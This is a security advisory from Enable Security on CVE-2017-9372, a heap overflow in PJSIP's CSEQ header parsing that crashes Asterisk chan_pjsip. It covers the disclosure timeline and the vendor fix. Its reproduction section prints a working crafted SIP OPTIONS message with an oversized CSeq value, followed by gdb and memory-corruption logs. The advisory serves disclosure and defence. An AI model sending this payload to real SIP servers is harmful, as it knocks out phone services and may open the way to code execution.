# Heap overflow in CSEQ header parsing affects Asterisk chan_pjsip and PJSIP

- Authors: 
    - Alfred Farrugia <alfred@enablesecurity.com>
    - Sandro Gauci <sandro@enablesecurity.com>
- Vulnerable version: Asterisk 14.4.0 running `chan_pjsip`, PJSIP 2.6
- References: AST-2017-002, CVE-2017-9372
- Enable Security Advisory: <https://github.com/EnableSecurity/advisories/tree/master/ES2017-01-asterisk-pjsip-cseq-overflow>
- Vendor Advisory: <http://downloads.asterisk.org/pub/security/AST-2017-002.html>
- Timeline:
    - Report date: 2017-04-12
    - Digium confirmed issue: 2017-04-12
    - Digium patch and advisory: 2017-05-19
    - PJSIP added patch by Digium: 2017-05-21
    - Enable Security advisory: 2017-05-23

## Description

A specially crafted SIP message with a long CSEQ value will cause a heap overflow in PJSIP.

## Impact

Abuse of this vulnerability leads to denial of service in Asterisk when `chan_pjsip` is in use. This vulnerability is likely to be abused for remote code execution and may affect other code that makes use of PJSIP.

## How to reproduce the issue

We made use of the following SIP message which was sent to Asterisk over UDP to reproduce the issue:

    OPTIONS sip:localhost:5060 SIP/2.0
    From: <sip:test@localhost>
    To: <sip:test2@localhost>
    Call-ID: aa@0000000000
    CSeq: 0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
    Via: SIP/2.0/UDP 195.37.78.177:5060
    Contact: <sip:test@localhost>
    Content-Length: 0


    .

The following is a log from running Asterisk in gdb:

    gdb --args asterisk -c

    ....

    Asterisk Ready.
    [New Thread 0x7fffc87a7700 (LWP 412)]
    *CLI> [Thread 0x7ffff4bfe700 (LWP 379) exited]
    [Thread 0x7ffff4cf6700 (LWP 375) exited]
    [Thread 0x7ffff4dee700 (LWP 373) exited]

    *CLI> [Thread 0x7ffff4e6a700 (LWP 372) exited]
    [Thread 0x7ffff4f62700 (LWP 370) exited]

    Program received signal SIGSEGV, Segmentation fault.
    [Switching to Thread 0x7fffd6403700 (LWP 394)]
    malloc_consolidate (av=av@entry=0x7fffe8000020) at malloc.c:4151
    4151    malloc.c: No such file or directory.
    (gdb) bt
    #0  malloc_consolidate (av=av@entry=0x7fffe8000020) at malloc.c:4151
    #1  0x00007ffff5499ce8 in _int_malloc (av=0x7fffe8000020, bytes=4096) at malloc.c:3423
    #2  0x00007ffff549c6c0 in __GI___libc_malloc (bytes=4096) at malloc.c:2891
    #3  0x00007ffff78f0965 in default_block_alloc (factory=0x7fffd7dee0a0 <caching_pool>, size=4096) at ../src/pj/pool_policy_malloc.c:46
    #4  0x00007ffff78f801c in pj_pool_create_int (f=f@entry=0x7fffd7dee0a0 <caching_pool>, name=name@entry=0x7ffff790ad28 "tdta%p", initial_size=initial_size@entry=4096,
        increment_size=increment_size@entry=4000, callback=callback@entry=0x7ffff78741a0 <pool_callback>) at ../src/pj/pool.c:201

When the Asterisk Malloc debugger is used, the following logs can be seen upon exiting the process, showing that other memory segments are being overwritten by our malformed `CSEQ`:

     Asterisk Malloc Debugger Started (see /opt/asterisk/var/log/asterisk/mmlog))
    Asterisk Ready.
    [Apr 11 23:52:41] NOTICE[18382]: res_pjsip/pjsip_distributor.c:536 log_failed_request: Request 'OPTIONS' from '<sip:test@localhost>' failed for '10.0.2.2:44779' (callid: aa@0000000000) - No matching endpoint found
    ^CAsterisk cleanly ending (0).
    Executing last minute cleanups
      == Destroying musiconhold processes
      == Manager unregistered action DBGet
      == Manager unregistered action DBPut
      == Manager unregistered action DBDel
      == Manager unregistered action DBDelTree
    WARNING: High fence violation of 0x7ff0640058d0 allocated at ../src/pj/pool_policy_malloc.c default_block_alloc() line 46
    WARNING: Memory corrupted after free of 0x7ff064006970 allocated at AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$0$$aa@0000000000$195.37.78.177:5060$ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA$0$$aa@0000000000$195.37.78.177:5060$() line 1094795585
    Segmentation fault

This security issue was discovered through the use of simple fuzzing with [Radamsa](https://github.com/aoh/radamsa) and our internal toolset.

## Solutions and recommendations

Apply fix issued by Asterisk, upgrade to Asterisk 13.15.1, 14.4.1 or 13.13-cert4.

If making use of PJSIP, apply the patch in revision 5593. See <https://trac.pjsip.org/repos/ticket/2016>.

## About Enable Security

[Enable Security](https://www.enablesecurity.com) provides Information Security services, including Penetration Testing, Research and Development, to help protect client networks and applications against online attackers.

## Disclaimer

The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.
